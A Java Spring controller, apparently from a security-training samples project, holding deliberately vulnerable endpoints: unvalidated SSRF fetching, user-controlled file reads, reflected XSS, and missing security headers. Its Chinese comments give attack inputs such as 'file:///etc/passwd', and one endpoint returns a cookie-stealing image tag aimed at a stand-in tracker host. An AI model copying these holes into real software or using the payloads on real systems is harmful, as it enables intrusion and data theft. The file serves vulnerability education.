package com.freedom.securitysamples.api.serverSideRequestForgery;

import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import javax.servlet.http.HttpServletResponse;
import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.io.Writer;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * 服务器端请求伪造(SSRF)及安全头缺失漏洞示例控制器
 * 说明：
 * 1. SSRF漏洞允许攻击者诱导服务器发起恶意请求，可用于访问内部系统、端口扫描、数据泄露等
 * 2. 安全头缺失会导致XSS、点击劫持、MIME类型嗅探等附加风险
 * 修复建议：
 * - SSRF：限制请求协议/域名/端口（白名单）、禁用危险协议（file://, gopher://等）、过滤内部IP
 * - 安全头：添加X-Content-Type-Options、X-Frame-Options、Content-Security-Policy等必要安全头
 */
@RestController
@RequestMapping("/security-example")
public class ServerSideRequestForgeryController {

    /**
     * 不安全示例1：未验证的远程资源请求（典型SSRF）
     * 漏洞点：直接使用用户输入的URL发起服务器端请求，无任何校验
     * 攻击场景：
     * - 攻击者传入"http://192.168.1.1/admin"访问内网管理界面
     * - 传入"file:///etc/passwd"读取服务器敏感文件
     * - 传入"http://localhost:3306"探测内部服务端口
     */
    @GetMapping("/ssrf/unsafe/fetch-remote-resource")
    public String unsafeRemoteResourceFetch(@RequestParam String remoteResourceUrl) throws IOException {
        // 危险操作：直接使用用户提供的URL创建连接
        URL targetUrl = new URL(remoteResourceUrl);
        HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();
        connection.setRequestMethod("GET");
        
        // 返回响应信息（攻击者可通过响应推断内部资源状态）
        return "Remote request response: " + connection.getResponseMessage();
    }

    /**
     * 不安全示例2：未限制的本地文件读取（SSRF变种）
     * 漏洞点：允许用户控制文件路径，通过ImageIO读取本地文件
     * 风险扩展：虽用于图片读取，但可被利用读取任意文本文件（如配置文件、日志）
     * 攻击示例：传入"/app/config/database.properties"获取数据库凭证
     */
    @GetMapping("/ssrf/unsafe/load-local-file")
    public String unsafeLocalFileLoad(@RequestParam String localFilePath) throws IOException {
        // 危险操作：直接使用用户输入的路径加载本地文件
        File targetFile = new File(localFilePath);
        BufferedImage image = ImageIO.read(targetFile);
        
        // 即使读取失败，也可能泄露文件是否存在的信息
        return image != null ? "File loaded (assuming image format)" : "File read attempt completed";
    }

    /**
     * 不安全示例3：缺失X-Content-Type-Options头（MIME类型嗅探风险）
     * 漏洞点：未设置"X-Content-Type-Options: nosniff"
     * 风险：浏览器可能忽略Content-Type，将文本解析为HTML/脚本，导致XSS
     * 攻击场景：攻击者注入的<script>标签被浏览器执行
     */
    @GetMapping("/headers/unsafe/missing-content-type-option")
    public ResponseEntity<String> missingXContentTypeOptionsHeader() {
        // 危险响应：返回HTML内容但未阻止MIME嗅探
        return ResponseEntity.ok()
                .body("<script>alert('XSS via MIME sniffing');</script>");
    }

    /**
     * 不安全示例4：缺失X-Frame-Options头（点击劫持风险）
     * 漏洞点：未设置"X-Frame-Options: DENY/SAMEORIGIN"
     * 风险：页面可被嵌入恶意网站的iframe中，诱导用户点击伪装按钮执行操作
     * 攻击场景：将银行转账页面嵌入iframe，覆盖透明按钮骗取用户点击
     */
    @GetMapping("/headers/unsafe/missing-frame-option")
    public void missingXFrameOptionsHeader(HttpServletResponse response) throws IOException {
        Writer responseWriter = response.getWriter();
        // 危险响应：敏感操作页面未限制iframe嵌入
        responseWriter.write("<h1>User Settings - Change Password</h1>");
        responseWriter.write("<form action='/change-password'>...</form>");
    }

    /**
     * 不安全示例5：缺失Content-Security-Policy(CSP)头（XSS防护缺失）
     * 漏洞点：未设置CSP限制资源加载和脚本执行
     * 风险：允许加载外部恶意资源，或执行内联脚本，增加XSS危害
     * 攻击场景：恶意图片链接跟踪用户，或执行窃取Cookie的脚本
     */
    @GetMapping("/headers/unsafe/missing-csp")
    public ResponseEntity<String> missingContentSecurityPolicy() {
        // 危险响应：未限制外部资源加载
        return ResponseEntity.ok()
                .body("<img src='http://malicious-tracker.com/steal?cookie='+document.cookie>");
    }

    /**
     * 不安全示例6：缺失Strict-Transport-Security(HSTS)头（降级攻击风险）
     * 漏洞点：未设置"HSTS: max-age=31536000; includeSubDomains"
     * 风险：用户可能被诱导通过HTTP访问，导致通信被窃听或篡改
     * 攻击场景：攻击者实施SSL剥离攻击，将HTTPS连接降级为HTTP
     */
    @GetMapping("/headers/unsafe/missing-hsts")
    public ResponseEntity<String> missingHstsHeader() {
        // 危险响应：传输敏感数据但未强制HTTPS
        return ResponseEntity.ok()
                .body("Sensitive user data: [user session, preferences, etc.]");
    }

    /**
     * 不安全示例7：缺失X-XSS-Protection头（XSS过滤机制失效）
     * 漏洞点：未设置"X-XSS-Protection: 1; mode=block"
     * 风险：浏览器内置XSS过滤器可能被禁用，无法拦截部分反射型XSS
     * 攻击场景：用户输入的恶意脚本直接回显在页面中被执行
     */
    @PostMapping("/headers/unsafe/missing-xss-protection")
    public ResponseEntity<String> missingXXssProtectionHeader(@RequestBody String userInput) {
        // 危险操作：直接拼接用户输入到响应（反射型XSS风险）
        return ResponseEntity.ok()
                .body("User input echo: " + userInput); // 若输入含<script>将执行
    }

    /**
     * 不安全示例8：缺失Referrer-Policy头（敏感信息泄露）
     * 漏洞点：未设置Referrer-Policy控制referrer信息发送
     * 风险：跳转时可能泄露当前页面URL（含敏感参数）给第三方网站
     * 攻击场景：从包含会话ID的URL跳转到外部网站，泄露用户会话信息
     */
    @GetMapping("/headers/unsafe/missing-referrer-policy")
    public ResponseEntity<String> missingReferrerPolicy() {
        // 危险跳转：未限制referrer信息，可能泄露来源URL
        return ResponseEntity.ok()
                .header("Location", "https://untrusted-third-party.com")
                .body("Redirecting to external site...");
    }
}
    